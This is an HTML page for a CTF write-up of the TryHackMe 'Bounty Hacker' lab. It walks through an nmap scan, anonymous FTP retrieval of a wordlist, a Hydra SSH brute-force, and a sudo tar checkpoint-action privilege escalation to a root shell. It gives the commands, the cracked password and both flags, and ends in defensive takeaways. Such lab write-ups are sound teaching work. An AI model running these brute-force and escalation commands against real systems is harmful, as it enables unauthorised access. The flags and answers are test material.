@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup: Bounty Hacker | 0xb0rn3</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --black:      #000000;
+            --bg:         #0a0908;
+            --bg-card:    #141210;
+            --bg-code:    #1a1816;
+            --bg-raised:  #211f1c;
+
+            --gray-2:     #504945;
+            --gray-3:     #3c3836;
+            --gray-4:     #282828;
+
+            --fg:         #ebdbb2;
+            --fg-muted:   #a89984;
+            --fg-dim:     #665c54;
+            --white:      #fbf1c7;
+
+            --yellow:     #fabd2f;
+            --orange:     #fe8019;
+            --aqua:       #8ec07c;
+            --red:        #fb4934;
+            --blue:       #83a598;
+            --purple:     #d3869b;
+            --green:      #b8bb26;
+
+            --border:     rgba(235,219,178,.10);
+            --border-mid: rgba(235,219,178,.22);
+            --border-hi:  rgba(250,189,47,.5);
+
+            --glow-y:     0 0 30px rgba(250,189,47,.12);
+            --glow-r:     0 0 30px rgba(251,73,52,.10);
+
+            --r-xs:   6px;
+            --r-sm:   10px;
+            --r:      16px;
+            --r-lg:   20px;
+            --r-pill: 999px;
+        }
+
+        *, *::before, *::after {
+            margin: 0; padding: 0;
+            box-sizing: border-box;
+        }
+
+        ::selection { background: var(--yellow); color: var(--black); }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'IBM Plex Mono', 'JetBrains Mono', monospace;
+            background: var(--black);
+            color: var(--fg);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        /* Grain */
+        body::before {
+            content: '';
+            position: fixed; inset: 0; z-index: 0;
+            pointer-events: none; opacity: .03;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+            background-size: 256px;
+        }
+
+        /* Scanline */
+        body::after {
+            content: '';
+            position: fixed; inset: 0; z-index: 0;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,.025) 2px, rgba(0,0,0,.025) 4px);
+        }
+
+        /* ── Scroll Progress ── */
+        .scroll-bar {
+            position: fixed; top: 0; left: 0;
+            width: 0%; height: 2px;
+            background: linear-gradient(90deg, var(--red), var(--orange), var(--yellow));
+            z-index: 9999;
+        }
+
+        /* ══════════════════════════════════
+           NAV
+        ══════════════════════════════════ */
+        .nav {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+            backdrop-filter: blur(20px);
+            background: rgba(0,0,0,.85);
+            border-bottom: 1px solid var(--border);
+            transition: all .3s;
+        }
+        .nav.scrolled {
+            background: rgba(0,0,0,.95);
+            box-shadow: 0 8px 32px rgba(0,0,0,.6);
+        }
+        .nav-inner {
+            max-width: 900px; margin: 0 auto;
+            padding: .65rem 1.5rem;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .nav-logo {
+            font-family: 'Orbitron', monospace;
+            font-size: .85rem; font-weight: 900;
+            color: var(--yellow);
+            text-decoration: none;
+            letter-spacing: 2px;
+            text-shadow: 0 0 20px rgba(250,189,47,.25);
+        }
+        .nav-logo:hover { color: var(--orange); }
+        .nav-logo .dim { color: var(--fg-dim); font-weight: 400; }
+
+        .nav-right {
+            display: flex; gap: .4rem; align-items: center;
+        }
+        .nav-btn {
+            color: var(--fg-dim);
+            text-decoration: none;
+            font-size: .62rem; font-weight: 600;
+            text-transform: uppercase; letter-spacing: 1.5px;
+            padding: .35rem .7rem;
+            border-radius: var(--r-xs);
+            transition: all .2s;
+        }
+        .nav-btn:hover { color: var(--yellow); }
+        .nav-btn i { margin-right: .3rem; font-size: .58rem; }
+
+        /* ══════════════════════════════════
+           HERO BANNER
+        ══════════════════════════════════ */
+        .hero {
+            padding: 7rem 1.5rem 3rem;
+            text-align: center;
+            position: relative; z-index: 10;
+            border-bottom: 1px solid var(--border);
+            background: radial-gradient(ellipse at 50% 80%, rgba(251,73,52,.04), transparent 60%);
+        }
+
+        .hero-tag {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: rgba(251,73,52,.08);
+            border: 1px solid rgba(251,73,52,.25);
+            border-radius: var(--r-pill);
+            padding: 3px 12px;
+            font-size: .55rem; font-weight: 700;
+            color: var(--red);
+            text-transform: uppercase; letter-spacing: 2px;
+            margin-bottom: 1rem;
+            animation: fadeUp .6s .1s both;
+        }
+        .hero-tag .pulse {
+            width: 5px; height: 5px; border-radius: 50%;
+            background: var(--red);
+            box-shadow: 0 0 6px var(--red);
+            animation: blink 2s ease-in-out infinite;
+        }
+        @keyframes blink { 50% { opacity: .3; } }
+
+        .hero-title {
+            font-family: 'Orbitron', monospace;
+            font-size: clamp(1.4rem,4.5vw,2.2rem);
+            font-weight: 900; color: var(--white);
+            letter-spacing: .04em;
+            line-height: 1.2;
+            margin-bottom: .4rem;
+            animation: fadeUp .6s .2s both;
+        }
+        .hero-title .accent { color: var(--red); }
+
+        .hero-sub {
+            font-size: clamp(.62rem,1.6vw,.74rem);
+            color: var(--fg-dim);
+            letter-spacing: 1px;
+            margin-bottom: 1.2rem;
+            animation: fadeUp .6s .3s both;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Meta table */
+        .meta-grid {
+            display: inline-grid;
+            grid-template-columns: auto auto;
+            gap: .15rem 1.5rem;
+            text-align: left;
+            font-size: clamp(.6rem,1.5vw,.7rem);
+            background: var(--bg-card);
+            border: 1px solid var(--border-mid);
+            border-radius: var(--r);
+            padding: 1rem 1.4rem;
+            animation: fadeUp .6s .4s both;
+        }
+        .meta-key {
+            color: var(--fg-dim);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .meta-val { color: var(--fg); }
+        .meta-val.flag {
+            color: var(--aqua);
+            font-weight: 700;
+            background: rgba(142,192,124,.08);
+            padding: 0 6px;
+            border-radius: var(--r-xs);
+        }
+        .meta-val.severity {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        /* ══════════════════════════════════
+           ARTICLE LAYOUT
+        ══════════════════════════════════ */
+        .article {
+            max-width: 820px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            position: relative; z-index: 10;
+        }
+
+        .writeup-section {
+            padding: clamp(2rem,5vh,3.5rem) 0;
+            border-bottom: 1px solid var(--border);
+            opacity: 0; transform: translateY(16px);
+            transition: opacity .5s ease, transform .5s ease;
+        }
+        .writeup-section.visible {
+            opacity: 1; transform: translateY(0);
+        }
+        .writeup-section:last-child { border-bottom: none; }
+
+        /* Step header */
+        .step-header {
+            display: flex; align-items: center; gap: .7rem;
+            margin-bottom: 1rem;
+        }
+        .step-num {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: rgba(251,73,52,.12);
+            border: 1px solid rgba(251,73,52,.3);
+            display: flex; align-items: center; justify-content: center;
+            font-family: 'Orbitron', monospace;
+            font-size: .7rem; font-weight: 900;
+            color: var(--red);
+            flex-shrink: 0;
+        }
+        .step-title {
+            font-family: 'Orbitron', monospace;
+            font-size: clamp(.9rem,2.5vw,1.15rem);
+            font-weight: 700;
+            color: var(--white);
+            letter-spacing: .5px;
+        }
+        .step-label {
+            font-size: .55rem;
+            color: var(--fg-dim);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+
+        /* Prose */
+        .prose {
+            font-size: clamp(.72rem,1.8vw,.84rem);
+            color: var(--fg-muted);
+            line-height: 1.85;
+            margin-bottom: 1rem;
+        }
+        .prose strong { color: var(--fg); font-weight: 600; }
+        .prose code {
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            border-radius: var(--r-xs);
+            padding: 1px 6px;
+            font-size: .92em;
+            color: var(--yellow);
+        }
+        .prose a {
+            color: var(--blue);
+            text-decoration: none;
+            border-bottom: 1px solid rgba(131,165,152,.3);
+            transition: all .2s;
+        }
+        .prose a:hover { color: var(--yellow); border-color: var(--yellow); }
+
+        /* ── Code Blocks ── */
+        .code-block {
+            background: var(--bg-code);
+            border: 1px solid var(--border-mid);
+            border-radius: var(--r-sm);
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+        .code-bar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: .4rem .8rem;
+            background: rgba(40,40,40,.5);
+            border-bottom: 1px solid var(--border);
+        }
+        .code-lang {
+            font-size: .55rem;
+            color: var(--fg-dim);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+        }
+        .code-copy {
+            background: none; border: none;
+            color: var(--fg-dim);
+            font-size: .55rem; font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 2px 6px;
+            border-radius: var(--r-xs);
+            transition: all .2s;
+            font-family: inherit;
+        }
+        .code-copy:hover { color: var(--yellow); }
+        .code-copy.copied { color: var(--aqua); }
+
+        .code-body {
+            padding: .8rem 1rem;
+            overflow-x: auto;
+            font-size: clamp(.62rem,1.5vw,.73rem);
+            line-height: 1.7;
+            tab-size: 4;
+        }
+        .code-body pre {
+            margin: 0;
+            white-space: pre;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* Syntax colors */
+        .kw  { color: var(--red); }
+        .fn  { color: var(--yellow); }
+        .str { color: var(--aqua); }
+        .cmt { color: var(--fg-dim); font-style: italic; }
+        .num { color: var(--purple); }
+        .op  { color: var(--orange); }
+        .out { color: var(--aqua); }
+        .dim { color: var(--fg-dim); }
+        .path { color: var(--blue); }
+        .flag-hl { color: var(--aqua); font-weight: 700; background: rgba(142,192,124,.1); padding: 0 4px; border-radius: 3px; }
+
+        /* ── Response/Output Block ── */
+        .response-block {
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--aqua);
+            border-radius: var(--r-xs);
+            padding: .7rem 1rem;
+            margin: .8rem 0;
+            font-size: clamp(.62rem,1.5vw,.72rem);
+            line-height: 1.7;
+        }
+
+        /* ── Attack Chain Diagram ── */
+        .chain-wrap {
+            margin: 1.5rem 0;
+        }
+        .chain-step {
+            display: flex; gap: .8rem;
+            align-items: flex-start;
+            position: relative;
+            padding-bottom: 1.2rem;
+        }
+        .chain-step:last-child { padding-bottom: 0; }
+        .chain-step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            left: 14px; top: 30px; bottom: 0;
+            width: 1px;
+            background: linear-gradient(to bottom, var(--red), rgba(251,73,52,.15));
+        }
+
+        .chain-dot {
+            width: 28px; height: 28px;
+            border-radius: 50%;
+            background: var(--bg-card);
+            border: 2px solid var(--red);
+            display: flex; align-items: center; justify-content: center;
+            font-size: .6rem; font-weight: 900;
+            color: var(--red);
+            flex-shrink: 0;
+            z-index: 1;
+            font-family: 'Orbitron', monospace;
+        }
+        .chain-dot.final {
+            background: var(--red);
+            color: var(--black);
+            box-shadow: 0 0 12px rgba(251,73,52,.3);
+        }
+
+        .chain-info { flex: 1; }
+        .chain-label {
+            font-size: .65rem;
+            font-weight: 700;
+            color: var(--fg);
+            margin-bottom: .15rem;
+        }
+        .chain-detail {
+            font-size: .6rem;
+            color: var(--fg-dim);
+            line-height: 1.5;
+        }
+        .chain-detail code {
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            padding: 0 4px;
+            border-radius: 3px;
+            color: var(--yellow);
+            font-size: .58rem;
+        }
+
+        /* ── Vulnerability Table ── */
+        .vuln-table-wrap {
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+        .vuln-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: clamp(.58rem,1.4vw,.68rem);
+        }
+        .vuln-table th {
+            background: var(--bg-raised);
+            color: var(--fg-dim);
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-size: .55rem;
+            padding: .55rem .7rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border-mid);
+        }
+        .vuln-table td {
+            padding: .55rem .7rem;
+            border-bottom: 1px solid var(--border);
+            color: var(--fg-muted);
+            vertical-align: top;
+        }
+        .vuln-table tr:hover td { background: rgba(250,189,47,.02); }
+        .sev-crit { color: var(--red); font-weight: 700; }
+        .sev-high { color: var(--orange); font-weight: 700; }
+        .sev-med  { color: var(--yellow); font-weight: 700; }
+        .sev-low  { color: var(--blue); font-weight: 600; }
+
+        /* ── Takeaway Cards ── */
+        .takeaway-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: .7rem;
+            margin: 1rem 0;
+        }
+        .takeaway {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--r-sm);
+            padding: .8rem 1rem;
+            transition: all .25s;
+        }
+        .takeaway:hover {
+            border-color: var(--border-mid);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,0,0,.3);
+        }
+        .takeaway-icon {
+            font-size: .85rem;
+            margin-bottom: .4rem;
+        }
+        .takeaway-text {
+            font-size: clamp(.6rem,1.4vw,.7rem);
+            color: var(--fg-muted);
+            line-height: 1.6;
+        }
+        .takeaway-text strong { color: var(--fg); }
+
+        /* ── Exploit Script Section ── */
+        .exploit-header {
+            display: flex; align-items: center; justify-content: space-between;
+            flex-wrap: wrap; gap: .5rem;
+            margin-bottom: 1rem;
+        }
+        .exploit-title-group {
+            display: flex; align-items: center; gap: .7rem;
+        }
+        .exploit-icon {
+            width: 36px; height: 36px;
+            border-radius: var(--r-sm);
+            background: rgba(250,189,47,.1);
+            border: 1px solid rgba(250,189,47,.25);
+            display: flex; align-items: center; justify-content: center;
+            color: var(--yellow);
+            font-size: .9rem;
+        }
+        .gh-link {
+            display: inline-flex; align-items: center; gap: .4rem;
+            font-size: .6rem; font-weight: 700;
+            color: var(--blue);
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: .3rem .7rem;
+            border: 1px solid rgba(131,165,152,.25);
+            border-radius: var(--r-pill);
+            transition: all .2s;
+        }
+        .gh-link:hover { background: var(--blue); color: var(--black); }
+
+        /* ── Flag Captured Banner ── */
+        .flag-banner {
+            background: rgba(142,192,124,.06);
+            border: 1px solid rgba(142,192,124,.25);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            text-align: center;
+            margin: 1.5rem 0;
+            position: relative;
+            overflow: hidden;
+        }
+        .flag-banner::before {
+            content: '';
+            position: absolute; inset: 0;
+            background: radial-gradient(circle at 50% 50%, rgba(142,192,124,.06), transparent 70%);
+        }
+        .flag-label {
+            font-size: .55rem;
+            color: var(--aqua);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: 700;
+            margin-bottom: .3rem;
+        }
+        .flag-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: clamp(1rem,3vw,1.4rem);
+            font-weight: 700;
+            color: var(--aqua);
+            text-shadow: 0 0 20px rgba(142,192,124,.25);
+            letter-spacing: 1px;
+            position: relative;
+        }
+
+        /* ── Footer ── */
+        .footer {
+            border-top: 1px solid var(--border);
+            background: var(--bg-card);
+            padding: 1.5rem;
+            text-align: center;
+            position: relative; z-index: 10;
+        }
+        .footer-text {
+            font-size: .58rem;
+            color: var(--fg-dim);
+            letter-spacing: 1.5px;
+        }
+        .footer-text span { color: var(--yellow); }
+
+        /* ── Scroll Top ── */
+        .scroll-top {
+            position: fixed; bottom: 1.2rem; right: 1.2rem; z-index: 1000;
+            width: 36px; height: 36px;
+            border-radius: var(--r-sm);
+            background: var(--bg-card);
+            color: var(--yellow);
+            border: 1px solid var(--border-mid);
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; font-size: .75rem;
+            opacity: 0; pointer-events: none;
+            transition: all .25s;
+        }
+        .scroll-top.show { opacity: 1; pointer-events: auto; }
+        .scroll-top:hover { background: var(--yellow); color: var(--black); }
+
+        /* ── Scrollbar ── */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: var(--black); }
+        ::-webkit-scrollbar-thumb { background: var(--gray-2); border-radius: 99px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--yellow); }
+
+        /* ── Responsive ── */
+        @media (max-width: 600px) {
+            .meta-grid { grid-template-columns: 1fr; gap: .3rem; }
+            .takeaway-grid { grid-template-columns: 1fr; }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="scroll-bar" id="scrollBar"></div>
+
+    <!-- NAV -->
+    <nav class="nav" id="navbar">
+        <div class="nav-inner">
+            <a href="index.html" class="nav-logo"><span class="dim">[</span>0xb0rn3<span class="dim">]</span></a>
+            <div class="nav-right">
+                <a href="index.html" class="nav-btn"><i class="fas fa-home"></i>Home</a>
+                <a href="CTF.html" class="nav-btn"><i class="fas fa-trophy"></i>All CTFs</a>
+                <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/Bounty_Hacker" target="_blank" class="nav-btn"><i class="fab fa-github"></i>Repo</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <header class="hero">
+        <div class="hero-tag"><span class="pulse"></span>CTF Writeup</div>
+        <h1 class="hero-title">Bounty <span class="accent">Hacker</span></h1>
+        <p class="hero-sub">TryHackMe &middot; FTP / SSH Brute-Force / PrivEsc &middot; Easy &middot; by 0xb0rn3</p>
+
+        <div class="meta-grid">
+            <span class="meta-key">Platform</span>  <span class="meta-val">TryHackMe</span>
+            <span class="meta-key">Category</span>  <span class="meta-val">FTP Enum / SSH Brute-Force / Sudo Abuse</span>
+            <span class="meta-key">Difficulty</span> <span class="meta-val severity">Easy</span>
+            <span class="meta-key">Target</span>     <span class="meta-val"><code>10.48.146.252</code></span>
+            <span class="meta-key">Stack</span>       <span class="meta-val">vsftpd 3.0.5 / OpenSSH 8.2p1 / Apache 2.4.41</span>
+            <span class="meta-key">Flags</span>       <span class="meta-val flag">2 flags captured</span>
+        </div>
+    </header>
+
+    <main class="writeup">
+
+        <!-- STEP 0 &mdash; OVERVIEW -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">0</div>
+                <div>
+                    <div class="step-label">Context</div>
+                    <h2 class="step-title">Overview</h2>
+                </div>
+            </div>
+            <p>
+                Bounty Hacker is a straightforward box that teaches the classic
+                FTP-to-SSH-to-root pipeline. Anonymous FTP leaks a username and a custom
+                password wordlist, Hydra brute-forces SSH in seconds, and a misconfigured
+                <code>sudo /bin/tar</code> rule gives instant root via GTFOBins checkpoint abuse.
+            </p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">ATTACK CHAIN</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre>nmap &rarr; 21/FTP, 22/SSH, 80/HTTP
+  &darr;
+ftp anonymous &rarr; task.txt (author: lin) + locks.txt (26 passwords)
+  &darr;
+hydra SSH brute-force &rarr; lin:RedDr4gonSynd1cat3
+  &darr;
+ssh lin@ &rarr; user.txt: THM{CR1M3_SyNd1C4T3}
+  &darr;
+sudo -l &rarr; (root) /bin/tar
+  &darr;
+sudo tar --checkpoint-action=exec=/bin/sh &rarr; root
+  &darr;
+root.txt: THM{80UN7Y_h4cK3r}</pre>
+            </div>
+        </section>
+
+        <!-- STEP 1 &mdash; RECON -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">1</div>
+                <div>
+                    <div class="step-label">Reconnaissance</div>
+                    <h2 class="step-title">Port Scan &amp; Service Discovery</h2>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> nmap -sV -sC -T4 -p- --min-rate 5000 -Pn 10.48.146.252</pre>
+            </div>
+
+            <div class="vuln-table-wrap">
+                <table class="vuln-table">
+                    <thead>
+                        <tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><code>21/tcp</code></td><td>FTP</td><td>vsftpd 3.0.5</td><td style="color:var(--red);">Anonymous login allowed</td></tr>
+                        <tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH 8.2p1</td><td>Brute-force target</td></tr>
+                        <tr><td><code>80/tcp</code></td><td>HTTP</td><td>Apache 2.4.41</td><td>Cowboy Bebop themed page</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <p>Three services running. FTP with anonymous login is the obvious first target.</p>
+        </section>
+
+        <!-- STEP 2 &mdash; FTP -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">2</div>
+                <div>
+                    <div class="step-label">Enumeration</div>
+                    <h2 class="step-title">FTP &mdash; Anonymous Access</h2>
+                </div>
+            </div>
+
+            <p>Anonymous FTP login yields two files:</p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">task.txt</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="out-line" style="color:var(--orange);">1.) Protect Vicious.</span>
+<span class="out-line" style="color:var(--orange);">2.) Plan for Red Eye pickup on the moon.</span>
+<span class="out-line" style="color:var(--orange);">-lin</span></pre>
+            </div>
+
+            <p>
+                Task list author: <code>lin</code> &mdash; our target SSH username.
+            </p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">locks.txt (26 entries)</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="out-line">rEddrAGON</span>
+<span class="out-line">ReDdr4g0nSynd!cat3</span>
+<span class="out-line">Dr@gOn$yn9icat3</span>
+<span class="out-line">R3DDr46ONSYndIC@Te</span>
+<span class="out-line">...</span>
+<span class="out-line" style="color:var(--aqua);font-weight:600;">RedDr4gonSynd1cat3  &larr; the one</span>
+<span class="out-line">...</span>
+<span class="out-line">ReDSynd1ca7e</span></pre>
+            </div>
+
+            <p>
+                A 26-entry wordlist of Dragon Syndicate leet-speak variations. Combined with
+                username <code>lin</code>, this is a textbook SSH brute-force setup.
+            </p>
+        </section>
+
+        <!-- STEP 3 &mdash; HYDRA -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">3</div>
+                <div>
+                    <div class="step-label">Exploitation</div>
+                    <h2 class="step-title">Hydra SSH Brute-Force</h2>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> hydra -l lin -P locks.txt ssh://10.48.146.252 -t 16 -f -V
+
+<span class="out-line">[ATTEMPT] target 10.48.146.252 - login "lin" - pass "rEddrAGON" - 1 of 26</span>
+<span class="out-line">...</span>
+<span class="out-line" style="color:var(--aqua);font-weight:700;">[22][ssh] host: 10.48.146.252   login: lin   password: RedDr4gonSynd1cat3</span>
+<span class="out-line">[STATUS] attack finished for 10.48.146.252 (valid pair found)</span></pre>
+            </div>
+
+            <p>
+                Hit on attempt 10 of 26. Password: <code>RedDr4gonSynd1cat3</code>
+            </p>
+        </section>
+
+        <!-- STEP 4 &mdash; USER FLAG -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">4</div>
+                <div>
+                    <div class="step-label">Initial Access</div>
+                    <h2 class="step-title">SSH &mdash; User Shell &amp; Flag</h2>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> ssh lin@10.48.146.252
+<span class="out-line">Password: RedDr4gonSynd1cat3</span>
+
+<span class="cmd-p">$</span> cat ~/Desktop/user.txt
+<span class="out-line" style="color:var(--aqua);font-weight:600;">THM{CR1M3_SyNd1C4T3}</span></pre>
+            </div>
+
+            <div class="flag-banner">
+                <div class="flag-label"><i class="fas fa-flag"></i> &nbsp;User Flag</div>
+                <div class="flag-value">THM{CR1M3_SyNd1C4T3}</div>
+            </div>
+        </section>
+
+        <!-- STEP 5 &mdash; PRIVESC -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">5</div>
+                <div>
+                    <div class="step-label">Privilege Escalation</div>
+                    <h2 class="step-title">sudo /bin/tar &rarr; GTFOBins Root</h2>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> sudo -l
+<span class="out-line">User lin may run the following commands:</span>
+<span class="out-line" style="color:var(--red);font-weight:700;">    (root) /bin/tar</span></pre>
+            </div>
+
+            <p>
+                <code>tar</code> is a well-known
+                <a href="https://gtfobins.github.io/gtfobins/tar/#sudo" target="_blank" style="color:var(--blue);text-decoration:none;border-bottom:1px dashed var(--blue);">GTFOBins sudo vector</a>.
+                The <code>--checkpoint-action</code> flag triggers arbitrary command execution
+                during archive operations:
+            </p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> sudo tar -cf /dev/null /dev/null     --checkpoint=1     --checkpoint-action=exec=/bin/sh
+
+<span class="out-line" style="color:var(--red);font-weight:700;"># whoami</span>
+<span class="out-line" style="color:var(--red);font-weight:700;">root</span>
+
+<span class="cmd-p">#</span> cat /root/root.txt
+<span class="out-line" style="color:var(--aqua);font-weight:600;">THM{80UN7Y_h4cK3r}</span></pre>
+            </div>
+
+            <div class="flag-banner">
+                <div class="flag-label"><i class="fas fa-flag"></i> &nbsp;Root Flag</div>
+                <div class="flag-value">THM{80UN7Y_h4cK3r}</div>
+            </div>
+        </section>
+
+        <!-- ATTACK CHAIN -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num"><i class="fas fa-link" style="font-size:.55rem"></i></div>
+                <div>
+                    <div class="step-label">Visualization</div>
+                    <h2 class="step-title">Attack Chain</h2>
+                </div>
+            </div>
+
+            <div class="chain-wrap">
+                <div class="chain-step">
+                    <div class="chain-dot">1</div>
+                    <div class="chain-info">
+                        <div class="chain-label">FTP Anonymous Access</div>
+                        <div class="chain-detail"><code>task.txt</code> &rarr; username <code>lin</code>, <code>locks.txt</code> &rarr; 26-entry password wordlist</div>
+                    </div>
+                </div>
+                <div class="chain-step">
+                    <div class="chain-dot">2</div>
+                    <div class="chain-info">
+                        <div class="chain-label">Hydra SSH Brute-Force</div>
+                        <div class="chain-detail"><code>lin:RedDr4gonSynd1cat3</code> &mdash; hit on attempt 10 of 26</div>
+                    </div>
+                </div>
+                <div class="chain-step">
+                    <div class="chain-dot">3</div>
+                    <div class="chain-info">
+                        <div class="chain-label">SSH Initial Access</div>
+                        <div class="chain-detail"><code>cat ~/Desktop/user.txt</code> &rarr; <span class="flag-hl">THM{CR1M3_SyNd1C4T3}</span></div>
+                    </div>
+                </div>
+                <div class="chain-step">
+                    <div class="chain-dot final"><i class="fas fa-flag" style="font-size:.5rem"></i></div>
+                    <div class="chain-info">
+                        <div class="chain-label">sudo tar checkpoint &rarr; Root</div>
+                        <div class="chain-detail"><code>--checkpoint-action=exec=/bin/sh</code> &rarr; <span class="flag-hl">THM{80UN7Y_h4cK3r}</span></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- VULNERABILITIES -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num"><i class="fas fa-bug" style="font-size:.55rem"></i></div>
+                <div>
+                    <div class="step-label">Assessment</div>
+                    <h2 class="step-title">Vulnerabilities</h2>
+                </div>
+            </div>
+
+            <div class="vuln-table-wrap">
+                <table class="vuln-table">
+                    <thead>
+                        <tr><th>Finding</th><th>Location</th><th>Severity</th><th>Impact</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>sudo /bin/tar (GTFOBins)</td>
+                            <td>sudoers config</td>
+                            <td><span class="sev sev-crit">Critical</span></td>
+                            <td>Instant root via checkpoint callback</td>
+                        </tr>
+                        <tr>
+                            <td>Weak SSH password</td>
+                            <td>SSH (22)</td>
+                            <td><span class="sev sev-high">High</span></td>
+                            <td>Brute-forced in 10 attempts from custom wordlist</td>
+                        </tr>
+                        <tr>
+                            <td>Anonymous FTP with sensitive files</td>
+                            <td>FTP (21)</td>
+                            <td><span class="sev sev-high">High</span></td>
+                            <td>Username and password wordlist exposed</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- TAKEAWAYS -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num"><i class="fas fa-shield-alt" style="font-size:.55rem"></i></div>
+                <div>
+                    <div class="step-label">Defense</div>
+                    <h2 class="step-title">Takeaways</h2>
+                </div>
+            </div>
+
+            <div class="takeaway-grid">
+                <div class="takeaway-card">
+                    <div class="takeaway-icon"><i class="fas fa-folder-open"></i></div>
+                    <div class="takeaway-title">Disable Anonymous FTP</div>
+                    <div class="takeaway-text">
+                        Anonymous FTP exposed the username and a targeted password wordlist.
+                        If FTP is needed, require authentication and audit exposed files.
+                    </div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon"><i class="fas fa-key"></i></div>
